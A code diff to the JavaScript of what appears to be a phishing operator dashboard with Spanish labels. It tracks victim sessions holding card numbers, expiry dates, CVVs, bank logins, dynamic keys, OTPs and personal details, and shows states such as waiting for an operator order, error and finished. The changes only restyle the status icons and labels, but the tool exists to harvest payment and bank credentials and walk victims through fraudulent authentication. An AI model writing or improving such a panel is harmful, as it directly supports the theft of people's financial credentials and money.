@@ -371,21 +371,21 @@ function getLockedSectionType(session) {
     return t;
 }
 
-function getCcIcon(s) {
+function getCcStatus(s) {
     const action = String(s.action || "").toUpperCase();
     const hasCc = !!s.cc && !!s.exp && !!s.cvv;
 
-    if (!hasCc || ["CC", "CC_WAIT_ACTION"].includes(action)) return "⌛";
-    if (
-        (hasCc && action.includes("CC_ERROR")) ||
-        (!hasCc && !action.includes("CC"))
-    )
-        return "❌";
-    if (hasCc && !action.includes("CC")) return "💸";
-    return "";
+    if (!hasCc || ["CC", "CC_WAIT_ACTION"].includes(action))
+        return { icon: "⏳", state: "waiting", label: "Esperando" };
+    if ((hasCc && action.includes("CC_ERROR")) || (!hasCc && !action.includes("CC")))
+        return { icon: "✕", state: "error", label: "Error" };
+    if (hasCc && !action.includes("CC"))
+        return { icon: "✓", state: "success", label: "Completado" };
+    return { icon: "—", state: "idle", label: "" };
 }
 
 function sectionCc(s) {
+    const status = getCcStatus(s);
     return `
     <div class="section-content">
       <div class="section-header">CC</div>
@@ -410,25 +410,28 @@ function sectionCc(s) {
         </div>
       </div>
     </div>
-    <div class="section-icon">${getCcIcon(s)}</div>
+    <div class="section-status ${status.state}">
+      <span class="status-icon">${status.icon}</span>
+      <span class="status-label">${status.label}</span>
+    </div>
   `;
 }
 
-function getLogoIcon(s) {
+function getLogoStatus(s) {
     const action = String(s.action || "").toUpperCase();
     const hasLogo = !!s.user && !!s.pass;
 
-    if (!hasLogo || ["AUTH", "AUTH_WAIT_ACTION"].includes(action)) return "⌛";
-    if (
-        (hasLogo && action.includes("AUTH_ERROR")) ||
-        (!hasLogo && !action.includes("AUTH"))
-    )
-        return "❌";
-    if (hasLogo && !action.includes("AUTH")) return "💸";
-    return "";
+    if (!hasLogo || ["AUTH", "AUTH_WAIT_ACTION"].includes(action))
+        return { icon: "⏳", state: "waiting", label: "Esperando" };
+    if ((hasLogo && action.includes("AUTH_ERROR")) || (!hasLogo && !action.includes("AUTH")))
+        return { icon: "✕", state: "error", label: "Error" };
+    if (hasLogo && !action.includes("AUTH"))
+        return { icon: "✓", state: "success", label: "Completado" };
+    return { icon: "—", state: "idle", label: "" };
 }
 
 function sectionLogo(s) {
+    const status = getLogoStatus(s);
     return `
     <div class="section-content">
       <div class="section-header">LOGO</div>
@@ -443,26 +446,28 @@ function sectionLogo(s) {
         </div>
       </div>
     </div>
-    <div class="section-icon">${getLogoIcon(s)}</div>
+    <div class="section-status ${status.state}">
+      <span class="status-icon">${status.icon}</span>
+      <span class="status-label">${status.label}</span>
+    </div>
   `;
 }
 
-function getDinaIcon(s) {
+function getDinaStatus(s) {
     const action = String(s.action || "").toUpperCase();
     const hasDina = !!s.dinamic;
 
     if (!hasDina || ["DINAMIC", "DINAMIC_WAIT_ACTION"].includes(action))
-        return "⌛";
-    if (
-        (hasDina && action.includes("DINAMIC_ERROR")) ||
-        (!hasDina && !action.includes("DINAMIC"))
-    )
-        return "❌";
-    if (hasDina && !action.includes("DINAMIC")) return "💸";
-    return "";
+        return { icon: "⏳", state: "waiting", label: "Esperando" };
+    if ((hasDina && action.includes("DINAMIC_ERROR")) || (!hasDina && !action.includes("DINAMIC")))
+        return { icon: "✕", state: "error", label: "Error" };
+    if (hasDina && !action.includes("DINAMIC"))
+        return { icon: "✓", state: "success", label: "Completado" };
+    return { icon: "—", state: "idle", label: "" };
 }
 
 function sectionDina(s) {
+    const status = getDinaStatus(s);
     return `
     <div class="section-content">
       <div class="section-header">DINA</div>
@@ -473,25 +478,28 @@ function sectionDina(s) {
         </div>
       </div>
     </div>
-    <div class="section-icon">${getDinaIcon(s)}</div>
+    <div class="section-status ${status.state}">
+      <span class="status-icon">${status.icon}</span>
+      <span class="status-label">${status.label}</span>
+    </div>
   `;
 }
 
-function getOtpIcon(s) {
+function getOtpStatus(s) {
     const action = String(s.action || "").toUpperCase();
     const hasOtp = !!s.otp;
 
-    if (!hasOtp || ["OTP", "OTP_WAIT_ACTION"].includes(action)) return "⌛";
-    if (
-        (hasOtp && action.includes("OTP_ERROR")) ||
-        (!hasOtp && !action.includes("OTP"))
-    )
-        return "❌";
-    if (hasOtp && !action.includes("OTP")) return "💸";
-    return "";
+    if (!hasOtp || ["OTP", "OTP_WAIT_ACTION"].includes(action))
+        return { icon: "⏳", state: "waiting", label: "Esperando" };
+    if ((hasOtp && action.includes("OTP_ERROR")) || (!hasOtp && !action.includes("OTP")))
+        return { icon: "✕", state: "error", label: "Error" };
+    if (hasOtp && !action.includes("OTP"))
+        return { icon: "✓", state: "success", label: "Completado" };
+    return { icon: "—", state: "idle", label: "" };
 }
 
 function sectionOtp(s) {
+    const status = getOtpStatus(s);
     return `
     <div class="section-content">
       <div class="section-header">OTP</div>
@@ -502,21 +510,28 @@ function sectionOtp(s) {
         </div>
       </div>
     </div>
-    <div class="section-icon">${getOtpIcon(s)}</div>
+    <div class="section-status ${status.state}">
+      <span class="status-icon">${status.icon}</span>
+      <span class="status-label">${status.label}</span>
+    </div>
   `;
 }
 
-function getDataIcon(s) {
+function getDataStatus(s) {
     const action = String(s.action || "").toUpperCase();
     const hasData = !!s.name && !!s.document && !!s.address && !!s.email;
 
-    if (!hasData && ["DATA", "DATA_WAIT_ACTION"].includes(action)) return "🔥";
-    if (hasData && action.includes("DATA_ERROR")) return "⌛";
-    if (hasData && !action.includes("DATA")) return "💸";
-    return "❌";
+    if (!hasData && ["DATA", "DATA_WAIT_ACTION"].includes(action))
+        return { icon: "⏳", state: "waiting", label: "Esperando" };
+    if (hasData && action.includes("DATA_ERROR"))
+        return { icon: "✕", state: "error", label: "Error" };
+    if (hasData && !action.includes("DATA"))
+        return { icon: "✓", state: "success", label: "Completado" };
+    return { icon: "—", state: "idle", label: "Sin datos" };
 }
 
 function sectionOther(s) {
+    const status = getDataStatus(s);
     return `
     <div class="section-content">
       <div class="section-header">Información Personal</div>
@@ -559,7 +574,10 @@ function sectionOther(s) {
         </div>
       </div>
     </div>
-    <div class="section-icon">📋</div>
+    <div class="section-status ${status.state}">
+      <span class="status-icon">${status.icon}</span>
+      <span class="status-label">${status.label}</span>
+    </div>
   `;
 }
 
@@ -973,15 +991,31 @@ function renderDetail(s) {
                 flowCc ? ccText : flowAuth ? AuthText : "⌛";
         }
         if (pillAction) {
-            pillAction.className = `pill ${
-                s.action.endsWith("_ERROR") ? "error" : "section-missing"
-            }`;
+            const action = String(s.action || "").toUpperCase();
 
-            pillAction.textContent = s.action.endsWith("_ERROR")
-                ? "ERROR"
-                : s.action.endsWith("_WAIT_ACTION")
-                  ? "ESPERANDO ORDEN 💡"
-                  : "Esperando Datos";
+            // Extraer nombre base del action
+            const getBaseName = (act) => {
+                if (act === "FINISH") return "FINISH";
+                if (act.startsWith("DINAMIC")) return "DINA";
+                if (act.startsWith("AUTH")) return "LOGO";
+                return act.replace("_WAIT_ACTION", "").replace("_ERROR", "");
+            };
+
+            const baseName = getBaseName(action);
+
+            if (action === "FINISH") {
+                pillAction.className = "pill success";
+                pillAction.innerHTML = `<span class="pill-icon">✓</span> ${baseName}`;
+            } else if (action.endsWith("_ERROR")) {
+                pillAction.className = "pill error";
+                pillAction.innerHTML = `<span class="pill-icon">✕</span> ${baseName}`;
+            } else if (action.endsWith("_WAIT_ACTION")) {
+                pillAction.className = "pill warning";
+                pillAction.innerHTML = `<span class="pill-icon">⚠</span> ${baseName}`;
+            } else {
+                pillAction.className = "pill loading";
+                pillAction.innerHTML = `<span class="pill-icon spinner">⏳</span> ${baseName}`;
+            }
         }
 
         renderActionsHTML(s, "modalActions");
